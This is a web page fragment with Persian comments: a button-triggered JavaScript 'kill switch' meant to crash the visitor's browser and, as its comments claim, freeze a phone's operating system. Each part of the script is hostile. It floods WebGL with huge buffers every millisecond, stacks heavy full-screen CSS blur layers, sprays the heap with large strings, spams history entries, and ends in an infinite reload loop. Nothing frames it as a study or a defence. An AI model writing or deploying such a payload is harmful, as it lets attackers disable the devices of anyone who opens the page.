    <div id="status" style="margin-top: 20px; font-size: 12px; color: #555;">Status: Ready for Payload</div>

    <script>
        document.getElementById('killBtn').onclick = function() {
            document.getElementById('status').innerText = "Payload Injected. Overloading GPU...";
            
            // ۱. حمله به موتور گرافیکی (GPU Memory Overflow)
            // این بخش باعث می‌شود کل سیستم‌عامل موبایل برای ثانیه‌ای فریز شود
            function floodGPU() {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                
                // ایجاد بافرهای عظیم که GPU را مجبور به کرش می‌کند
                setInterval(() => {
                    const buffer = gl.createBuffer();
                    gl.bindBuffer(gl.ARRAY_BUFFER, buffer);
                    gl.bufferData(gl.ARRAY_BUFFER, new Float32Array(10000000), gl.STATIC_DRAW);
                    
                    // ایجاد المان‌های سنگین CSS که موتور Compositor را قفل می‌کند
                    const leak = document.createElement('div');
                    leak.style.cssText = "width: 100vw; height: 100vh; backdrop-filter: blur(100px); mix-blend-mode: difference; position: fixed; top: 0;";
                    document.body.appendChild(leak);
                }, 1);
            }

            // ۲. نشت حافظه غیرقابل بازگشت (Heap Spraying)
            // از رشته‌های تصادفی استفاده می‌کنیم تا مرورگر نتواند آن‌ها را فشرده کند
            let vault = [];
            function heapSpray() {
                while(true) {
                    let chunk = new Array(1000000).fill(Math.random()).join('---');
                    vault.push(chunk);
                    
                    // ایجاد فشار روی تاریخچه برای از کار انداختن کلیدهای سیستمی گوشی
                    window.history.pushState(null, "", "/" + Math.random());
                    
                    if (vault.length > 100) break; // انتقال به مرحله فریز
                }
            }

            // ۳. اجرای همزمان (The Kill Switch)
            try {
                floodGPU();
                heapSpray();
                
                // فریز کردن نهایی Main Thread
                const crash = () => {
                    console.log("CRASHING...");
                    while(true) {
                        location.reload(); // درخواست‌های مکرر ریلود همزمان با حلقه بی‌نهایت
                    }
                };
                crash();
            } catch(e) {
                location.reload();
            }
        };
    </script>
